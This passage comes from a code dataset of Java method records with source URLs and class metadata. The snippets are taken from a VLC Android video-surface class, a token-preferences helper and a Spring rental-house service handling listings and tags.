setSubtitlesSurface(SurfaceTexture subtitlesSurfaceTexture) {        setSurface(ID_SUBTITLES, new Surface(subtitlesSurfaceTexture), null);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "AWindow", "extends": null, "implements": ["IAWindowNativeHandler", "IVLCVout"], "modifiers": []}}, {"method_name": "attachViews", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void attachViews() {        if (mSurfacesState.get() != SURFACE_STATE_INIT || mSurfaceHelpers[ID_VIDEO] == null)            throw new IllegalStateException(\"already attached or video view not configured\");        mSurfacesState.set(SURFACE_STATE_ATTACHED);        synchronized (mBuffersGeometryCond) {            mBuffersGeometryCond.configured = false;            mBuffersGeometryCond.abort = false;        }        for (int id = 0; id < ID_MAX; ++id) {            final SurfaceHelper surfaceHelper = mSurfaceHelpers[id];            if (surfaceHelper != null)                surfaceHelper.attach();        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "AWindow", "extends": null, "implements": ["IAWindowNativeHandler", "IVLCVout"], "modifiers": []}}, {"method_name": "detachViews", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void detachViews() {        if (mSurfacesState.get() == SURFACE_STATE_INIT)            return;        mSurfacesState.set(SURFACE_STATE_INIT);        mHandler.removeCallbacksAndMessages(null);        synchronized (mBuffersGeometryCond) {            mBuffersGeometryCond.abort = true;            mBuffersGeometryCond.notifyAll();        }        for (int id = 0; id < ID_MAX; ++id) {            final SurfaceHelper surfaceHelper = mSurfaceHelpers[id];            if (surfaceHelper != null)                surfaceHelper.release();            mSurfaceHelpers[id] = null;        }        if (mSurfaceCallback != null)            mSurfaceCallback.onSurfacesDestroyed(this);        for (IVLCVout.Callback cb : mIVLCVoutCallbacks)            cb.onSurfacesDestroyed(this);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "AWindow", "extends": null, "implements": ["IAWindowNativeHandler", "IVLCVout"], "modifiers": []}}, {"method_name": "areViewsAttached", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean areViewsAttached() {        return mSurfacesState.get() != SURFACE_STATE_INIT;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "AWindow", "extends": null, "implements": ["IAWindowNativeHandler", "IVLCVout"], "modifiers": []}}, {"method_name": "onSurfaceCreated", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void onSurfaceCreated() {        if (mSurfacesState.get() != SURFACE_STATE_ATTACHED)            throw new IllegalArgumentException(\"invalid state\");        final SurfaceHelper videoHelper = mSurfaceHelpers[ID_VIDEO];        final SurfaceHelper subtitlesHelper = mSurfaceHelpers[ID_SUBTITLES];        if (videoHelper == null)            throw new NullPointerException(\"videoHelper shouldn't be null here\");        if (videoHelper.isReady() && (subtitlesHelper == null || subtitlesHelper.isReady())) {            mSurfacesState.set(SURFACE_STATE_READY);            if (mSurfaceCallback != null)                mSurfaceCallback.onSurfacesCreated(this);            for (IVLCVout.Callback cb : mIVLCVoutCallbacks)                cb.onSurfacesCreated(this);        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "AWindow", "extends": null, "implements": ["IAWindowNativeHandler", "IVLCVout"], "modifiers": []}}, {"method_name": "onSurfaceDestroyed", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void onSurfaceDestroyed() {        detachViews();    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "AWindow", "extends": null, "implements": ["IAWindowNativeHandler", "IVLCVout"], "modifiers": []}}, {"method_name": "areSurfacesWaiting", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "boolean", "snippet": "    protected boolean areSurfacesWaiting() {        return mSurfacesState.get() == SURFACE_STATE_ATTACHED;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "AWindow", "extends": null, "implements": ["IAWindowNativeHandler", "IVLCVout"], "modifiers": []}}, {"method_name": "sendMouseEvent", "params": ["int", "int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void sendMouseEvent(int action, int button, int x, int y) {        synchronized (mNativeLock) {            if (mCallbackNativeHandle != 0)                nativeOnMouseEvent(mCallbackNativeHandle, action, button, x, y);            else {                mMouseAction = action;                mMouseButton = button;                mMouseX = x;                mMouseY = y;            }        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "AWindow", "extends": null, "implements": ["IAWindowNativeHandler", "IVLCVout"], "modifiers": []}}, {"method_name": "setWindowSize", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setWindowSize(int width, int height) {        synchronized (mNativeLock) {            if (mCallbackNativeHandle != 0)                nativeOnWindowSize(mCallbackNativeHandle, width, height);            else {                mWindowWidth = width;                mWindowHeight = height;            }        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "AWindow", "extends": null, "implements": ["IAWindowNativeHandler", "IVLCVout"], "modifiers": []}}, {"method_name": "setCallback", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean setCallback(long nativeHandle) {        synchronized (mNativeLock) {            if (mCallbackNativeHandle != 0 && nativeHandle != 0)                return false;            mCallbackNativeHandle = nativeHandle;            if (mCallbackNativeHandle != 0) {                if (mMouseAction != -1)                    nativeOnMouseEvent(mCallbackNativeHandle, mMouseAction, mMouseButton, mMouseX, mMouseY);                if (mWindowWidth != -1 && mWindowHeight != -1)                    nativeOnWindowSize(mCallbackNativeHandle, mWindowWidth, mWindowHeight);            }            mMouseAction = mMouseButton = mMouseX = mMouseY = -1;            mWindowWidth = mWindowHeight = -1;        }        return true;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "AWindow", "extends": null, "implements": ["IAWindowNativeHandler", "IVLCVout"], "modifiers": []}}, {"method_name": "setNativeSurface", "params": ["int", "Surface"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void setNativeSurface(int id, Surface surface) {        synchronized (mNativeLock) {            mSurfaces[id] = surface;        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "AWindow", "extends": null, "implements": ["IAWindowNativeHandler", "IVLCVout"], "modifiers": []}}, {"method_name": "getNativeSurface", "params": ["int"], "throws": null, "modifiers": ["private"], "return_type": "Surface", "snippet": "    private Surface getNativeSurface(int id) {        synchronized (mNativeLock) {            return mSurfaces[id];        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "AWindow", "extends": null, "implements": ["IAWindowNativeHandler", "IVLCVout"], "modifiers": []}}, {"method_name": "getVideoSurface", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Surface", "snippet": "    public Surface getVideoSurface() {        return getNativeSurface(ID_VIDEO);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "AWindow", "extends": null, "implements": ["IAWindowNativeHandler", "IVLCVout"], "modifiers": []}}, {"method_name": "getSubtitlesSurface", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Surface", "snippet": "    public Surface getSubtitlesSurface() {        return getNativeSurface(ID_SUBTITLES);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "AWindow", "extends": null, "implements": ["IAWindowNativeHandler", "IVLCVout"], "modifiers": []}}, {"method_name": "setBuffersGeometry", "params": ["Surface", "int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean setBuffersGeometry(final Surface surface, final int width, final int height, final int format) {        if (AndroidUtil.isICSOrLater())            return false;        if (width * height == 0)            return false;        Log.d(TAG, \"configureSurface: \" + width + \"x\" + height);        synchronized (mBuffersGeometryCond) {            if (mBuffersGeometryCond.configured || mBuffersGeometryCond.abort)                return false;        }        mHandler.post(new Runnable() {            private SurfaceHelper getSurfaceHelper(Surface surface) {                for (int id = 0; id < ID_MAX; ++id) {                    final SurfaceHelper surfaceHelper = mSurfaceHelpers[id];                    if (surfaceHelper != null && surfaceHelper.getSurface() == surface)                        return surfaceHelper;                }                return null;            }            @Override            public void run() {                final SurfaceHelper surfaceHelper = getSurfaceHelper(surface);                final SurfaceHolder surfaceHolder = surfaceHelper != null ? surfaceHelper.getSurfaceHolder() : null;                if (surfaceHolder != null) {                    if (surfaceHolder.getSurface().isValid()) {                        if (format != 0)                            surfaceHolder.setFormat(format);                        surfaceHolder.setFixedSize(width, height);                    }                }                synchronized (mBuffersGeometryCond) {                    mBuffersGeometryCond.configured = true;                    mBuffersGeometryCond.notifyAll();                }            }        });        try {            synchronized (mBuffersGeometryCond) {                while (!mBuffersGeometryCond.configured && !mBuffersGeometryCond.abort)                    mBuffersGeometryCond.wait();                mBuffersGeometryCond.configured = false;            }        } catch (InterruptedException e) {            return false;        }        return true;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "AWindow", "extends": null, "implements": ["IAWindowNativeHandler", "IVLCVout"], "modifiers": []}}, {"method_name": "addCallback", "params": ["IVLCVout"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addCallback(IVLCVout.Callback callback) {        if (!mIVLCVoutCallbacks.contains(callback))            mIVLCVoutCallbacks.add(callback);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "AWindow", "extends": null, "implements": ["IAWindowNativeHandler", "IVLCVout"], "modifiers": []}}, {"method_name": "removeCallback", "params": ["IVLCVout"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void removeCallback(IVLCVout.Callback callback) {        mIVLCVoutCallbacks.remove(callback);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "AWindow", "extends": null, "implements": ["IAWindowNativeHandler", "IVLCVout"], "modifiers": []}}, {"method_name": "setWindowLayout", "params": ["int", "int", "int", "int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setWindowLayout(final int width, final int height, final int visibleWidth, final int visibleHeight, final int sarNum, final int sarDen) {        mHandler.post(new Runnable() {            @Override            public void run() {                for (IVLCVout.Callback cb : mIVLCVoutCallbacks)                    cb.onNewLayout(AWindow.this, width, height, visibleWidth, visibleHeight, sarNum, sarDen);            }        });    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "AWindow", "extends": null, "implements": ["IAWindowNativeHandler", "IVLCVout"], "modifiers": []}}, {"method_name": "nativeOnMouseEvent", "params": ["long", "int", "int", "int", "int"], "throws": null, "modifiers": ["native", "public"], "return_type": "void", "snippet": "    public native void nativeOnMouseEvent(long nativeHandle, int action, int button, int x, int y);    public native void nativeOnWindowSize(long nativeHandle, int width, int height);}", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "AWindow", "extends": null, "implements": ["IAWindowNativeHandler", "IVLCVout"], "modifiers": []}}, {"method_name": "nativeOnWindowSize", "params": ["long", "int", "int"], "throws": null, "modifiers": ["native", "public"], "return_type": "void", "snippet": "    public native void nativeOnWindowSize(long nativeHandle, int width, int height);}", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "AWindow", "extends": null, "implements": ["IAWindowNativeHandler", "IVLCVout"], "modifiers": []}}, {"method_name": "setSurface", "params": ["Surface"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void setSurface(Surface surface) {            if (surface.isValid() && getNativeSurface(mId) == null) {                mSurface = surface;                setNativeSurface(mId, mSurface);                onSurfaceCreated();            }        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "SurfaceHelper", "extends": null, "implements": null, "modifiers": ["private"]}}, {"method_name": "attachSurfaceView", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void attachSurfaceView() {            mSurfaceHolder.addCallback(mSurfaceHolderCallback);            setSurface(mSurfaceHolder.getSurface());        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "SurfaceHelper", "extends": null, "implements": null, "modifiers": ["private"]}}, {"method_name": "attachTextureView", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void attachTextureView() {            mTextureView.setSurfaceTextureListener(mSurfaceTextureListener);            setSurface(new Surface(mTextureView.getSurfaceTexture()));        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "SurfaceHelper", "extends": null, "implements": null, "modifiers": ["private"]}}, {"method_name": "attachSurface", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void attachSurface() {            if (mSurfaceHolder != null)                mSurfaceHolder.addCallback(mSurfaceHolderCallback);            setSurface(mSurface);        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "SurfaceHelper", "extends": null, "implements": null, "modifiers": ["private"]}}, {"method_name": "attach", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void attach() {            if (mSurfaceView != null) {                attachSurfaceView();            } else if (mTextureView != null) {                attachTextureView();            } else if (mSurface != null) {                attachSurface();            } else                throw new IllegalStateException();        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "SurfaceHelper", "extends": null, "implements": null, "modifiers": ["private"]}}, {"method_name": "releaseSurfaceTexture", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void releaseSurfaceTexture() {            if (mTextureView != null)                mTextureView.setSurfaceTextureListener(null);        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "SurfaceHelper", "extends": null, "implements": null, "modifiers": ["private"]}}, {"method_name": "release", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void release() {            mSurface = null;            setNativeSurface(mId, null);            if (mSurfaceHolder != null)                mSurfaceHolder.removeCallback(mSurfaceHolderCallback);            releaseSurfaceTexture();        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "SurfaceHelper", "extends": null, "implements": null, "modifiers": ["private"]}}, {"method_name": "isReady", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "        public boolean isReady() {            return mSurfaceView == null || mSurface != null;        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "SurfaceHelper", "extends": null, "implements": null, "modifiers": ["private"]}}, {"method_name": "getSurface", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Surface", "snippet": "        public Surface getSurface() {            return mSurface;        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "SurfaceHelper", "extends": null, "implements": null, "modifiers": ["private"]}}, {"method_name": "getSurfaceHolder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "SurfaceHolder", "snippet": "        public SurfaceHolder getSurfaceHolder() {            return mSurfaceHolder;        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "SurfaceHelper", "extends": null, "implements": null, "modifiers": ["private"]}}, {"method_name": "createSurfaceTextureListener", "params": [], "throws": null, "modifiers": ["private"], "return_type": "TextureView", "snippet": "        private TextureView.SurfaceTextureListener createSurfaceTextureListener() {            return new TextureView.SurfaceTextureListener() {                @Override                public void onSurfaceTextureAvailable(SurfaceTexture surfaceTexture, int width, int height) {                    setSurface(new Surface(surfaceTexture));                }                @Override                public void onSurfaceTextureSizeChanged(SurfaceTexture surface, int width, int height) {                }                @Override                public boolean onSurfaceTextureDestroyed(SurfaceTexture surface) {                    onSurfaceDestroyed();                    return true;                }                @Override                public void onSurfaceTextureUpdated(SurfaceTexture surface) {                }            };        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "SurfaceHelper", "extends": null, "implements": null, "modifiers": ["private"]}}, {"method_name": "getToken", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getToken () {            return preferences.getString(\"token\", null);        }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/util/SketchcodeUtil.java", "stars": "4", "class": {"name": "User", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "isAuthorized", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "        public boolean isAuthorized () {            return preferences.getString(\"token\", null) != null;        }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/util/SketchcodeUtil.java", "stars": "4", "class": {"name": "User", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setToken", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setToken (String token) {            preferences.edit().putString(\"token\", token).apply();        }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/util/SketchcodeUtil.java", "stars": "4", "class": {"name": "User", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "deleteData", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void deleteData() {            preferences.edit().clear().apply();        }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/util/SketchcodeUtil.java", "stars": "4", "class": {"name": "User", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "addHouse", "params": ["HouseForm"], "throws": null, "modifiers": ["public"], "return_type": "HouseDTO", "snippet": "    public HouseDTO addHouse(HouseForm houseForm) {        // \u623f\u5c4b\u8be6\u60c5\u6570\u636e\u586b\u5145\u4e0e\u6821\u9a8c        HouseDetail houseDetail = generateHouseDetail(houseForm);        // \u65b0\u589e\u623f\u5c4b\u4fe1\u606f        House house = modelMapper.map(houseForm, House.class);        house.setAdminId(AuthenticatedUserUtil.getUserId());        house = houseRepository.save(house);        //\u65b0\u589e\u623f\u5c4b\u8be6\u60c5\u4fe1\u606f        houseDetail.setHouseId(house.getId());        houseDetail = houseDetailRepository.save(houseDetail);        HouseDetailDTO houseDetailDTO = modelMapper.map(houseDetail, HouseDetailDTO.class);        // \u65b0\u589e\u623f\u5c4b\u56fe\u7247\u4fe1\u606f        List<HousePicture> housePictures = housePictureRepository.saveAll(generateHousePicture(houseForm, house.getId()));        List<HousePictureDTO> housePictureDTOList = housePictures.stream().map(picture -> modelMapper.map(picture, HousePictureDTO.class)).collect(Collectors.toList());        // \u65b0\u589e\u623f\u5c4b\u6807\u7b7e\u4fe1\u606f        List<HouseTag> houseTagList = generateHouseTag(houseForm, house.getId());        houseTagRepository.saveAll(houseTagList);        // \u8bbe\u7f6e\u8fd4\u56de\u7ed3\u679c        HouseDTO houseDTO = modelMapper.map(house, HouseDTO.class);        houseDTO.setCover(cdnPrefix + houseDTO.getCover());        houseDTO.setHouseDetail(houseDetailDTO);        houseDTO.setHousePictureList(housePictureDTOList);        houseDTO.setTags(houseForm.getTags());        return houseDTO;    }", "url": "https://raw.githubusercontent.com/harry-xqb/rent-house/master/src/main/java/com/harry/renthouse/service/house/impl/HouseServiceImpl.java", "stars": "3", "class": {"name": "HouseServiceImpl", "extends": null, "implements": ["HouseService"], "modifiers": ["public"]}}, {"method_name": "editHouse", "params": ["HouseForm"], "throws": null, "modifiers": ["public"], "return_type": "HouseDTO", "snippet": "    public HouseDTO editHouse(HouseForm houseForm) {        Long houseId = houseForm.getId();        // \u67e5\u770b\u623f\u6e90id\u662f\u5426\u5b58\u5728        House house = houseRepository.findByIdAndAdminId(houseId, AuthenticatedUserUtil.getUserId()).orElseThrow(() -> new BusinessException(ApiResponseEnum.HOUSE_NOT_FOUND_ERROR));        // \u67e5\u770b\u623f\u5c4b\u8be6\u60c5\u662f\u5426\u5b58\u5728        HouseDetail houseDetail = houseDetailRepository.findByHouseId(house.getId()).orElseThrow(() -> new BusinessException(ApiResponseEnum.HOUSE_DETAIL_NOT_FOUND_ERROR));        // \u66f4\u65b0\u623f\u5c4b\u4fe1\u606f        modelMapper.map(houseForm, house);        HouseDTO houseDTO = modelMapper.map(houseRepository.save(house), HouseDTO.class);        // \u66f4\u65b0\u623f\u5c4b\u8be6\u60c5        HouseDetail updateHouseDetail = generateHouseDetail(houseForm);        updateHouseDetail.setId(houseDetail.getId());        updateHouseDetail.setHouseId(houseId);        updateHouseDetail = houseDetailRepository.save(updateHouseDetail);        HouseDetailDTO houseDetailDTO = modelMapper.map(updateHouseDetail, HouseDetailDTO.class);        // \u83b7\u53d6\u7167\u7247\u4fe1\u606f        List<HousePicture> housePictures = housePictureRepository.saveAll(generateHousePicture(houseForm, houseId));        List<HousePictureDTO> housePicturesDTO = housePictures.stream().map(picture -> modelMapper.map(picture, HousePictureDTO.class)).collect(Collectors.toList());        // \u83b7\u53d6\u6807\u7b7e\u4fe1\u606f        List<HouseTag> houseTagList = houseTagRepository.findAllByHouseId(houseId);        List<String> tagNameList = houseTagList.stream().map(tag -> tag.getName()).collect(Collectors.toList());        // \u586b\u5145\u623f\u5c4b\u4fe1\u606f        houseDTO.setHouseDetail(houseDetailDTO);        houseDTO.setHousePictureList(housePicturesDTO);        houseDTO.setTags(tagNameList);        houseDTO.setCover(cdnPrefix + houseDTO.getCover());        return houseDTO;    }", "url": "https://raw.githubusercontent.com/harry-xqb/rent-house/master/src/main/java/com/harry/renthouse/service/house/impl/HouseServiceImpl.java", "stars": "3", "class": {"name": "HouseServiceImpl", "extends": null, "implements": ["HouseService"], "modifiers": ["public"]}}, {"method_name": "adminSearch", "params": ["AdminHouseSearchForm"], "throws": null, "modifiers": ["public"], "return_type": "ServiceMultiResult<HouseDTO>", "snippet": "    public ServiceMultiResult<HouseDTO> adminSearch(AdminHouseSearchForm searchForm) {        // \u6761\u4ef6\u67e5\u8be2        Specification querySpec = (Specification) (root, query, criteriaBuilder) -> {            List<Predicate> predicates = new ArrayList<>();            // \u7ba1\u7406\u5458id\u5fc5\u987b\u4e3a\u5f53\u524d\u8ba4\u8bc1\u7528\u6237            predicates.add(criteriaBuilder.equal(root.get(\"adminId\"), AuthenticatedUserUtil.getUserId()));            // \u641c\u7d22\u7684\u623f\u6e90\u72b6\u6001\u5fc5\u987b\u4e3a\u672a\u5220\u9664            predicates.add(criteriaBuilder.notEqual(root.get(\"status\"), HouseStatusEnum.DELETED.getValue()));            // \u5982\u679c\u57ce\u5e02\u4e0d\u4e3a\u7a7a\u5219\u5c06\u57ce\u5e02\u52a0\u5165\u6a21\u7cca\u67e5\u8be2            if(StringUtils.isNotBlank(searchForm.getCity())){                predicates.add(criteriaBuilder.like(root.get(\"city\"), \"%\" + searchForm.getCity() + \"%\"));            }            // \u5982\u679c\u521b\u5efa\u65f6\u95f4\u8d77\u59cb\u4e0d\u4e3a\u7a7a\u52a0\u5165\u641c\u7d22\u6761\u4ef6            if(searchForm.getCreateTimeMin() != null){                LocalDateTime minDate = searchForm.getCreateTimeMin().atStartOfDay();                predicates.add(criteriaBuilder.greaterThanOrEqualTo(root.get(\"createTime\"), minDate));            }            // \u5982\u679c\u521b\u5efa\u65f6\u95f4\u7ed3\u675f\u4e0d\u4e3a\u7a7a\u52a0\u5165\u641c\u7d22\u6761\u4ef6            if(searchForm.getCreateTimeMax() != null){                LocalDateTime maxDate = searchForm.getCreateTimeMax().atStartOfDay().plusDays(1);                predicates.add(criteriaBuilder.lessThanOrEqualTo(root.get(\"createTime\"), maxDate));            }            // \u5982\u679c\u6807\u9898\u4e0d\u4e3a\u7a7a\u52a0\u5165\u6a21\u7cca\u641c\u7d22\u6761\u4ef6            if(StringUtils.isNotBlank(searchForm.getTitle())){                predicates.add(criteriaBuilder.like(root.get(\"title\"), \"%\" + searchForm.getTitle() + \"%\"));            }            return criteriaBuilder.and(predicates.toArray(new Predicate[predicates.size()]));        };        // \u5206\u9875\u6761\u4ef6        Sort sort = Sort.by(Sort.Direction.valueOf(searchForm.getDirection()), searchForm.getOrderBy());        int page = searchForm.getPage() - 1;        Pageable pageable = PageRequest.of(page, searchForm.getSize(), sort);        Page<House> houses = houseRepository.findAll(querySpec, pageable);        List<HouseDTO> houseDTOList = houses.getContent().stream().map(house -> modelMapper.map(house, HouseDTO.class)).collect(Collectors.toList());        return new ServiceMultiResult<>((int)houses.getTotalElements(), houseDTOList);    }", "url": "https://raw.githubusercontent.com/harry-xqb/rent-house/master/src/main/java/com/harry/renthouse/service/house/impl/HouseServiceImpl.java", "stars": "3", "class": {"name": "HouseServiceImpl", "extends": null, "implements": ["HouseService"], "modifiers": ["public"]}}, {"method_name": "findCompleteHouse", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "HouseDTO", "snippet": "    public HouseDTO findCompleteHouse(Long houseId) {        // \u67e5\u627e\u623f\u5c4b\u4fe1\u606f        House house = houseRepository.findById(houseId).orElseThrow(() -> new BusinessException(ApiResponseEnum.HOUSE_NOT_FOUND_ERROR));        // \u67e5\u627e\u623f\u5c4b\u8be6\u60c5        HouseDetail houseDetail = houseDetailRepository.findByHouseId(houseId).orElseThrow(() -> new BusinessException(ApiResponseEnum.HOUSE_DETAIL_NOT_FOUND_ERROR));        // \u67e5\u627e\u623f\u5c4b\u6807\u7b7e        List<HouseTag> tags = houseTagRepository.findAllByHouseId(houseId);        // \u67e5\u627e\u623f\u5c4b\u7167\u7247        List<HousePicture> housePictureList = housePictureRepository.findAllByHouseId(houseId);        // \u7ec4\u88c5\u6210DTO\u5bf9\u8c61        HouseDTO houseDTO = modelMapper.map(house, HouseDTO.class);        HouseDetailDTO houseDetailDTO = modelMapper.map(houseDetail, HouseDetailDTO.class);        List<String> tagStringList = tags.stream().map(tag -> tag.getName()).collect(Collectors.toList());        List<HousePictureDTO> housePictureDTO = housePictureList.stream().map(picture -> modelMapper.map(picture, HousePictureDTO.class)).collect(Collectors.toList());        // \u8bbe\u7f6e\u7ec4\u88c5houseDTO        houseDTO.setCover(cdnPrefix + houseDTO.getCover());        houseDTO.setTags(tagStringList);        houseDTO.setHouseDetail(houseDetailDTO);        houseDTO.setHousePictureList(housePictureDTO);        return houseDTO;    }", "url": "https://raw.githubusercontent.com/harry-xqb/rent-house/master/src/main/java/com/harry/renthouse/service/house/impl/HouseServiceImpl.java", "stars": "3", "class": {"name": "HouseServiceImpl", "extends": null, "implements": ["HouseService"], "modifiers": ["public"]}}, {"method_name": "addTag", "params": ["TagForm"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addTag(TagForm tagForm) {        House house = houseRepository.findById(tagForm.getHouseId()).orElseThrow(() -> new BusinessException(ApiResponseEnum.HOUSE_NOT_FOUND_ERROR));        Optional<HouseTag> houseTagOptional = houseTagRepository.findByNameAndHouseId(tagForm.getName(), tagForm.getHouseId());        houseTagOptional.ifPresent(tag -> {            throw new BusinessException(ApiResponseEnum.TAG_ALREADY_EXIST);        });        HouseTag houseTag = new HouseTag();        houseTag.setHouseId(house.getId());        houseTag.setName(tagForm.getName());        houseTagRepository.save(houseTag);    }", "url": "https://raw.githubusercontent.com/harry-xqb/rent-house/master/src/main/java/com/harry/renthouse/service/house/impl/HouseServiceImpl.java", "stars": "3", "class": {"name": "HouseServiceImpl", "extends": null, "implements": ["HouseService"], "modifiers": ["public"]}}, {"method_name": "deleteTag", "params": ["TagForm"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void deleteTag(TagForm tagForm) {        houseRepository.findById(tagForm.getHouseId()).orElseThrow(() -> new 